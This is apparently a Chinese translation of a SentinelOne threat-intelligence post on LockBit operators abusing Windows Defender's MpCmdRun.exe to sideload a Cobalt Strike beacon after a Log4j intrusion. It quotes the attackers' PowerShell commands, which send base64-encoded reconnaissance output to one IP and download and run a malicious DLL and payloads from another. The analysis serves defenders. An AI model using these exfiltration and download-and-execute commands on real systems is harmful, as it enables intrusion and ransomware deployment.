# 依靠 Windows Defender | LockBit 勒索软件通过 Microsoft 安全工具侧面加载 Cobalt Strike

2022年08月04日

原文链接：https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/

最近，LockBit受到了相当多的关注。上周，SentinelLabs报道了LockBit 3.0（又名LockBit Black），描述了这种日益流行的RaaS的最新迭代如何实现一系列反分析和反调试例程。我们的研究很快被其他报告类似发现的人跟进。与此同时，早在4月份，SentinelLabs就报告了一家LockBit附属公司如何利用合法的VMware命令行工具VMwareXferlogs.exe来进行侧向加载Cobalt Strike。

在这篇文章中，将通过描述LockBit运营商或附属公司使用的另一种合法工具来追踪该事件，只是这次的问题工具属于安全工具：Windows Defender。在最近的调查中，我们发现黑客滥用Windows防御程序的命令行工具MpCmdRun.exe来解密和加载Cobalt Strike的有效载荷。


## 概述
最初的目标泄露是通过针对未修补的VMWare Horizon服务器的Log4j漏洞发生的。攻击者使用此处记录的PowerShell代码修改了安装web shell的应用程序的Blast Secure Gateway组件。

一旦获得初始访问权限，黑客就执行一系列枚举命令，并试图运行多种开发后工具，包括Meterpreter、PowerShell Empire和一种侧载Cobalt Strike的新方法。

特别是在尝试执行Cobalt Strike时，我们观察到一个新的合法工具用于侧加载恶意DLL，它可以解密负载。

![image](https://user-images.githubusercontent.com/86941613/186966965-3a501bac-738b-49f5-a7cc-9622d62db91b.png)

以前观察到的通过删除EDR/EPP的用户地挂钩、Windows事件跟踪和反恶意软件扫描接口来规避防御的技术也被观察到。

## 攻击链

![image](https://user-images.githubusercontent.com/86941613/186967030-23171b7b-f356-46ff-bf53-eb830413bef0.png)

一旦攻击者通过Log4j漏洞获得初始访问权限，侦察就开始使用PowerShell执行命令，并通过对IP的POST base64编码请求过滤命令输出。侦察活动示例如下：
```shell
powershell -c curl -uri http://139.180.184[.]147:80 -met POST -Body ([System.Convert]::ToBase64String(([System.Text.Encoding]::ASCII.GetBytes((whoami)))))powershell -c curl -uri http://139.180.184[.]147:80 -met POST -Body ([System.Convert]::ToBase64String(([System.Text.Encoding]::ASCII.GetBytes((nltest /domain_trusts)))))
```
一旦攻击者获得足够的权限，他们就会尝试下载并执行多个攻击后有效载荷。

攻击者从其控制的C2下载恶意DLL、加密负载和合法工具：
```
powershell -c Invoke-WebRequest -uri http://45.32.108[.]54:443/mpclient.dll -OutFile c:\windows\help\windows\mpclient.dll;Invoke-WebRequest -uri http://45.32.108[.]54:443/c0000015.log -OutFile c:\windows\help\windows\c0000015.log;Invoke-WebRequest -uri http://45.32.108[.]54:443/MpCmdRun.exe -OutFile c:\windows\help\windows\MpCmdRun.exe;c:\windows\help\windows\MpCmdRun.exe
```
值得注意的是，攻击者利用合法的Windows Defender命令行工具MpCmdRun.exe来解密和加载Cobalt Strike有效载荷。

![image](https://user-images.githubusercontent.com/86941613/186967254-9c7666e6-4bf8-4ff3-8017-96a2681130bf.png)

我们还注意到用于下载Cobalt Strike有效载荷的IP地址和用于执行侦察的IP地址之间的相关性：在下载Cobalt Strike后不久，攻击者试图执行并将输出发送到以139开头的IP，如下面两个片段所示。
```
powershell -c Invoke-WebRequest -uri http://45.32.108[.]54:443/glib-2.0.dll -OutFile c:\users\public\glib-2.0.dll;Invoke-WebRequest -uri http://45.32.108[.]54:443/c0000013.log -OutFile c:\users\public\c0000013.log;Invoke-WebRequest -uri http://45.32.108[.]54:443/VMwareXferlogs.exe -OutFile c:\users\public\VMwareXferlogs.exe;c:\users\public\VMwareXferlogs.exe
powershell -c curl -uri http://139.180.184[.]147:80 -met POST -Body ([System.Convert]::ToBase64String(([System.Text.Encoding]::ASCII.GetBytes((c:\users\public\VMwareXferlogs.exe)))))
```
与之前报告的 VMwareXferlogs.exe工具的侧加载相同的流程，MpCmd.exe被滥用来侧加载一个武器化的mpclient.dll，它从c0000015.log文件加载并解密Cobalt Strike信标。

因此，在攻击中使用的与使用Windows Defender命令行工具相关的组件有:

|文件名|描述|
| ----------- | ----------- |
|mpclient.dll|由MpCmdRun.exe加载的武器化DLL|
|MpCmdRun.exe|合法/签名的Microsoft Defender实用程序|
|C0000015.log|加密Cobalt Strike有效载荷|
